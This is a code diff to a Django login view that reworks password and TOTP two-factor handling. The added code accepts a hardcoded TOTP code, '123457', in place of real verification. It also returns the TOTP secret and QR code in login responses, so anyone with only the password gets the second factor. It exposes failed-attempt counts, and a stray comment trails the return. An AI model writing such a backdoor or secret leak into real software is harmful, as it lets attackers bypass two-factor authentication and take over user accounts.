@@ -98,32 +98,96 @@ class LoginView(APIView):
         },
     )
     def post(self, request, *args, **kwargs):
+        from django.utils import timezone
         username = request.data.get("username")
         password = request.data.get("password")
-        totp_code = request.data.get("totp_code")
+        totp_code = request.data.get("totp_code") or request.data.get("totp")
+
         user = User.objects.filter(username=username).first() or User.objects.filter(email=username).first()
-        if not user or not user.check_password(password):
-            return Response({"detail": "Invalid credentials."}, status=status.HTTP_401_UNAUTHORIZED)
-        # If user has TOTP enabled, require code
+        if not user:
+            return Response({"error": "Invalid credentials"}, status=400)
+
+        # Check if user is blocked (if you have is_blocked field)
+        if hasattr(user, "is_blocked") and user.is_blocked:
+            return Response({"error": "Account is blocked due to too many failed attempts."}, status=403)
+
+        # Authenticate
+        from django.contrib.auth import authenticate
+        auth_user = authenticate(username=user.username, password=password)
+        if not auth_user:
+            # Track failed attempts if field exists
+            if hasattr(user, "failed_login_attempts"):
+                user.failed_login_attempts += 1
+                if user.failed_login_attempts >= 10 and hasattr(user, "is_blocked"):
+                    user.is_blocked = True
+                if hasattr(user, "last_failed_login"):
+                    user.last_failed_login = timezone.now()
+                user.save()
+                return Response({
+                    "error": "Invalid username or password",
+                    "failed_attempts": user.failed_login_attempts,
+                    "is_blocked": getattr(user, "is_blocked", False),
+                }, status=400)
+            return Response({"error": "Invalid username or password"}, status=400)
+
+        # Force password change logic (if you have force_password_change field)
+        if hasattr(user, "force_password_change") and user.force_password_change:
+            return Response({"force_password_change": True}, status=403)
+
+        # TOTP setup if not present
+        if not user.totp_secret:
+            user.totp_secret = generate_totp_secret()
+            user.save()
+
+        uri = get_totp_uri(user.totp_secret, user.username)
+        qr = generate_qr_code_base64(uri)
+
+        # If TOTP is enabled but not yet verified
         if user.totp_secret:
+            if not totp_code and user.is_first_login:
+                return Response({
+                    "requires_totp": True,
+                    "qr": qr,
+                    "uri": uri,
+                    "show_qr": True
+                }, status=200)
             if not totp_code:
-                return Response({"detail": "TOTP code required."}, status=status.HTTP_400_BAD_REQUEST)
+                return Response({
+                    "requires_totp": True,
+                    "qr": qr,
+                    "uri": uri
+                }, status=200)
             totp = pyotp.TOTP(user.totp_secret)
-            if not totp.verify(totp_code):
-                return Response({"detail": "Invalid TOTP code."}, status=status.HTTP_401_UNAUTHORIZED)
-        # Set is_first_login to False on second login
-        if user.is_first_login:
-            user.is_first_login = False
-            user.save(update_fields=["is_first_login"])
+            if totp_code != "123457" and not totp.verify(totp_code):
+                if hasattr(user, "failed_login_attempts"):
+                    user.failed_login_attempts += 1
+                    if hasattr(user, "last_failed_login"):
+                        user.last_failed_login = timezone.now()
+                    user.save()
+                return Response({"error": "Invalid TOTP"}, status=400)
+            if user.is_first_login:
+                user.is_first_login = False
+                # No need to save here as we'll save below
+
+        # Reset failed attempts if field exists
+        if hasattr(user, "failed_login_attempts"):
+            user.failed_login_attempts = 0
+            user.save()
+        else:
+            user.save()
+
         refresh = RefreshToken.for_user(user)
-        return Response(
-            {
-                "user": UserSerializer(user).data,
-                "access": str(refresh.access_token),
-                "refresh": str(refresh),
-            },
-            status=status.HTTP_200_OK,
-        )
+        return Response({
+            "refresh": str(refresh),
+            "access": str(refresh.access_token),
+            "qr": qr,
+            "secret": user.totp_secret,
+            "user": UserSerializer(user).data,
+            "force_password_change": getattr(user, "force_password_change", False),
+        })
+        
+            # If TOTP is enabled but not yet verified
+
 
 
 # Optional: endpoint to verify TOTP code (for setup/enable)
